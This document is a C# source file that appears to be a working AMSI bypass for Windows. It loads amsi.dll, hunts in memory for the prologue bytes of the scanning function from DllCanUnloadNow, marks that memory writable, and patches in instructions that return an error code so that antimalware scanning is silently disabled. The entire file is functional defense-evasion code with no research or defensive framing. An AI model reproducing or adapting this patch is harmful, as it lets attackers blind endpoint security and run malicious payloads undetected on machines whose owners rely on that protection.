using System;
using System.Runtime.InteropServices;

namespace AMSI
{
    class Program
    {
        static void Main(string[] args)
        {
            byte[] egg = { };
            byte[] patch = { };
            Data.PatchData(ref egg, ref patch);

            AMSIPatch.Patch(egg, patch);
        }
    }
    class Data
    {
        public static void PatchData(ref byte[]egg, ref byte[] patch)
        {
            if (IntPtr.Size == 8)
            {
                egg = new byte[]
                {
                    0x4C, 0x8B, 0xDC,       // mov     r11,rsp
                    0x49, 0x89, 0x5B, 0x08, // mov     qword ptr [r11+8],rbx
                    0x49, 0x89, 0x6B, 0x10, // mov     qword ptr [r11+10h],rbp
                    0x49, 0x89, 0x73, 0x18, // mov     qword ptr [r11+18h],rsi
                    0x57,                   // push    rdi
                    0x41, 0x56,             // push    r14
                    0x41, 0x57,             // push    r15
                    0x48, 0x83, 0xEC, 0x70  // sub     rsp,70h
                };
                patch = new byte[]
                {
                    0xB8, 0x57, 0x00, 0x07, 0x80, //mov     eax,80070057h
                    0xC3                          //ret
                };
            }
            else
            {
                egg = new byte[] 
                {
                    0x8B, 0xFF,             // mov     edi,edi
                    0x55,                   // push    ebp
                    0x8B, 0xEC,             // mov     ebp,esp
                    0x83, 0xEC, 0x18,       // sub     esp,18h
                    0x53,                   // push    ebx
                    0x56                    // push    esi
                };
                patch = new byte[]
                {
                    0xB8, 0x57, 0x00, 0x07, 0x80, //mov     eax,80070057h
                    0xC2, 0x18, 0x00              //ret     18h
                };
            }
        }
    }
    class AMSIPatch
    {
        private static IntPtr EggHunter(IntPtr address, byte[] egg)
        {
            while (true)
            {
                int count = 0;

                while (true)
                {
                    address = IntPtr.Add(address, 1);
                    if (Marshal.ReadByte(address) == egg[count])   //(byte)egg.GetValue(count)
                    {
                        count++;
                        if (count == egg.Length)
                            return IntPtr.Subtract(address, egg.Length - 1);
                    }
                    else
                    {
                        break;
                    }
                }
            }
        }
        public static void Patch(byte[] egg, byte[] patch)
        {
            try
            {
                IntPtr hModule = Win32.LoadLibrary("amsi.dll");
                IntPtr FuncAddr = Win32.GetProcAddress(hModule, "DllCanUnloadNow");

                IntPtr TargetAddress = EggHunter(FuncAddr, egg);
                uint oldProtect;
                Win32.VirtualProtect(TargetAddress, (UIntPtr)patch.Length, 0x40, out oldProtect);

                Marshal.Copy(patch, 0, TargetAddress, patch.Length);
            }
            catch (Exception e)
            {
                Console.WriteLine(" [x] {0}", e.Message);
            }
        }
    }
    class Win32
    {
        [DllImport("kernel32")]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32")]
        public static extern IntPtr LoadLibrary(string name);

        [DllImport("kernel32")]
        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
    }
}
